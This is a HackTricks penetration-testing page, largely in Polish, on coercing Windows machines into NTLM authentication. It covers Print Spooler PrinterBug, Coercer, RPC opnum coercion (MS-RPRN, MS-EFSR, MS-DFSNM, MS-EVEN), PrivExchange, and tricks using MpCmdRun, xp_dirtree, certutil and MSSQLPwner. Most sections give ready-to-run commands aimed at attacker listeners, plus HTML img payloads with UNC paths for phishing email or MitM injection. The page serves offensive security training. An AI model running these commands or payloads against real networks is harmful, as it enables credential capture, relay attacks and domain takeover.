# Force NTLM Privileged Authentication

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) to **kolekcja** **remote authentication triggers** napisana w C# przy użyciu kompilatora MIDL, aby uniknąć zależności firm trzecich.

## Spooler Service Abuse

Jeśli usługa _**Print Spooler**_ jest **włączona,** możesz użyć już znanych poświadczeń AD, aby **zażądać** od serwera wydruku Domain Controller’a **aktualizacji** o nowych zadaniach drukowania i po prostu kazać mu **wysłać powiadomienie do jakiegoś systemu**.\
Pamiętaj, że gdy drukarka wysyła powiadomienie do arbitralnego systemu, musi **uwierzytelnić się wobec** tego **systemu**. W związku z tym atakujący może sprawić, że usługa _**Print Spooler**_ uwierzytelni się wobec arbitralnego systemu, a usługa użyje w tym uwierzytelnieniu **konta komputera**.

Pod maską klasyczny primitive **PrinterBug** nadużywa **`RpcRemoteFindFirstPrinterChangeNotificationEx`** przez **`\\PIPE\\spoolss`**. Atakujący najpierw otwiera uchwyt do printera/serwera, a następnie podaje fałszywą nazwę klienta w `pszLocalMachine`, dzięki czemu docelowy spooler tworzy kanał powiadomień **z powrotem do hosta kontrolowanego przez atakującego**. Dlatego efekt to **wymuszenie uwierzytelnienia wychodzącego**, a nie bezpośrednie wykonanie kodu.\
Jeśli szukasz **RCE/LPE** w samym spoolerze, sprawdź [PrintNightmare](printnightmare.md). Ta strona koncentruje się na **coercion i relay**.

### Finding Windows Servers on the domain

Using PowerShell, get a list of Windows boxes. Servers are usually priority, so lets focus there:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Znajdowanie usług Spooler nasłuchujących

Korzystając z lekko zmodyfikowanego [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) @mysmartlogin (Vincent Le Toux), sprawdź, czy usługa Spooler nasłuchuje:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Możesz także użyć `rpcdump.py` w Linux i poszukać protokołu **MS-RPRN**:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
Lub szybko przetestuj hosty z Linuxa za pomocą **NetExec/CrackMapExec**:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
Jeśli chcesz **enumerate coercion surfaces** zamiast tylko sprawdzać, czy endpoint spooler istnieje, użyj **Coercer scan mode**:
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
To jest przydatne, ponieważ zobaczenie endpointu w EPM mówi tylko, że interfejs print RPC jest zarejestrowany. To **nie** gwarantuje, że każda metoda coercion jest osiągalna przy Twoich bieżących uprawnieniach ani że host wygeneruje użyteczny flow uwierzytelniania.

### Poproś usługę o uwierzytelnienie się przeciwko dowolnemu hostowi

Możesz skompilować [SpoolSample from here](https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
lub użyj [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) albo [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py), jeśli jesteś na Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
Z **Coercer** możesz bezpośrednio targetować interfejsy spoolera i uniknąć zgadywania, która metoda RPC jest wystawiona:
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### Wymuszanie HTTP zamiast SMB z WebClient

Klasyczny PrinterBug zwykle skutkuje uwierzytelnieniem **SMB** do `\\attacker\share`, co nadal jest przydatne do **capture**, **relay to HTTP targets** lub **relay where SMB signing is absent**.\
Jednak w nowoczesnych środowiskach relaying **SMB to SMB** jest często blokowany przez **SMB signing**, więc operatorzy często wolą wymusić zamiast tego uwierzytelnianie **HTTP/WebDAV**.

Jeśli na celu działa usługa **WebClient**, listener można określić w formie, która sprawia, że Windows użyje **WebDAV over HTTP**:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Jest to szczególnie przydatne przy łączeniu z **`ntlmrelayx --adcs`** lub innymi targetami HTTP relay, ponieważ nie opiera się na relayability SMB na wymuszonym połączeniu. Ważne zastrzeżenie: aby wariant HTTP/WebDAV działał, **WebClient musi działać** na ofierze.

### Combining with Unconstrained Delegation

Jeśli atakujący ma już przejęty komputer z [Unconstrained Delegation](unconstrained-delegation.md), może on **sprawić, że drukarka uwierzytelni się wobec tego komputera**. Ze względu na unconstrained delegation, **TGT** konta komputera **drukarki** zostanie **zapisany w** **pamięci** komputera z unconstrained delegation. Ponieważ atakujący ma już przejęty ten host, będzie mógł **pobrać ten ticket** i nadużyć go ([Pass the Ticket](pass-the-ticket.md)).

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)

### RPC UNC-path coercion matrix (interfaces/opnums that trigger outbound auth)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: asynchronous print interface on the same spooler pipe; use Coercer to enumerate reachable methods on a given host
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (also via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce

Note: These methods accept parameters that can carry a UNC path (e.g., `\\attacker\share`). When processed, Windows will authenticate (machine/user context) to that UNC, enabling NetNTLM capture or relay.\
For spooler abuse, **MS-RPRN opnum 65** remains the most common and best-documented primitive because the protocol specification explicitly states that the server creates a notification channel back to the client specified by `pszLocalMachine`.

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN over \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)
- Effect: the target attempts to open the supplied backup log path and authenticates to the attacker-controlled UNC.
- Practical use: coerce Tier 0 assets (DC/RODC/Citrix/etc.) to emit NetNTLM, then relay to AD CS endpoints (ESC8/ESC11 scenarios) or other privileged services.

## PrivExchange

Atak `PrivExchange` jest wynikiem luki znalezionej w funkcji **Exchange Server `PushSubscription`**. Funkcja ta pozwala wymusić, aby Exchange server uwierzytelnił się do dowolnego hosta podanego przez klienta przez HTTP, używając dowolnego użytkownika domeny posiadającego mailbox.

Domyślnie usługa **Exchange działa jako SYSTEM** i otrzymuje nadmierne uprawnienia (konkretnie ma uprawnienia **WriteDacl on the domain pre-2019 Cumulative Update**). Tę lukę można wykorzystać do umożliwienia **relaying of information to LDAP i następnie wyciągnięcia domenowej bazy NTDS**. W przypadkach, gdy relay do LDAP nie jest możliwy, tę lukę nadal można wykorzystać do relay i uwierzytelniania wobec innych hostów w domenie. Skuteczne wykorzystanie tego ataku daje natychmiastowy dostęp do Domain Admin przy użyciu dowolnego uwierzytelnionego konta domenowego.

## Inside Windows

Jeśli jesteś już wewnątrz maszyny Windows, możesz wymusić, aby Windows połączył się z serwerem, używając uprzywilejowanych kont, za pomocą:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Lub użyj tej innej techniki: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Możliwe jest użycie certutil.exe lolbin (binarny plik podpisany przez Microsoft) do wymuszenia uwierzytelniania NTLM:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Przez email

Jeśli znasz **adres email** użytkownika, który loguje się do maszyny, którą chcesz skompromitować, możesz po prostu wysłać mu **email z obrazem 1x1** taki jak
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
i gdy on to otworzy, spróbuje się uwierzytelnić.

### MitM

Jeśli możesz przeprowadzić atak MitM na komputer i wstrzyknąć HTML do strony, którą zobaczy, możesz spróbować wstrzyknąć obrazek taki jak poniższy do strony:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Inne sposoby wymuszenia i phishingu uwierzytelniania NTLM


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Cracking NTLMv1

Jeśli możesz przechwycić [NTLMv1 challenges przeczytaj tutaj, jak je crackować](../ntlm/index.html#ntlmv1-attack).\
_Pamiętaj, że aby crackować NTLMv1, musisz ustawić challenge Responder na "1122334455667788"_

## References
- [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)

{{#include ../../banners/hacktricks-training.md}}
